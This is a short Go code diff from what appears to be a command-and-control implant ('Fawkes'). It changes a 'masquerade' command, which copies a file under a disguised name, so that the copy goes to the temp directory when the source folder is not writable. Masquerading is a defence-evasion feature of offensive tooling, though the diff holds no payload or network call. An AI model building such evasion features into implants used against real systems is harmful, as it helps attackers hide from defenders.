@@ -57,7 +57,17 @@ func (c *MasqueradeCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorf("Error generating masquerade name: %v", err)
 	}
 
-	destPath := filepath.Join(filepath.Dir(args.Source), destName)
+	// Place in source directory if writable, otherwise use temp directory
+	destDir := filepath.Dir(args.Source)
+	testFile := filepath.Join(destDir, ".fawkes_write_test")
+	if f, err := os.Create(testFile); err != nil {
+		// Source directory not writable — use temp directory
+		destDir = os.TempDir()
+	} else {
+		f.Close()
+		os.Remove(testFile)
+	}
+	destPath := filepath.Join(destDir, destName)
 
 	if args.InPlace {
 		// Rename in place
